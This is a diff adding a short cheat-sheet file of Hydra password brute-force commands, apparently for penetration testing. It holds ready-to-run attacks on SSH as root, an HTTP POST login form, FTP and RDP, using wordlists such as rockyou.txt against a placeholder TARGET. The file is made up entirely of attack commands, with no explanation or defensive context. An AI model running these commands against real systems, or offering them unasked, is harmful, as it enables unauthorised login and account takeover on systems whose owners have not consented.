@@ -1,0 +1,11 @@
+# SSH brute force
+hydra -l root -P rockyou.txt ssh://TARGET
+
+# HTTP POST form
+hydra -l admin -P passlist.txt TARGET http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid login"
+
+# FTP brute force
+hydra -L users.txt -P pass.txt ftp://TARGET
+
+# RDP brute (Windows)
+hydra -t 4 -V -f -l admin -P pass.txt rdp://TARGET
